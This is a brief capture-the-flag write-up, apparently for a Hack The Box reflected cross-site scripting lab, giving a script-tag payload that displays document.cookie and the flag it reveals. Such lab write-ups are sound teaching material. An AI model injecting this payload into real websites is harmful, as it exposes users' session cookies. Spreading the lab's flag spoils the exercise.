## Challenge 

To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. 

## Solution

Using the same process as the first lab, I put the following js payload:

```js
<script>alert(document.cookie)</script>
```

and it provided the answer:

```sh
cookie=HTB{r3fl3c73d_b4ck_2_m3}
```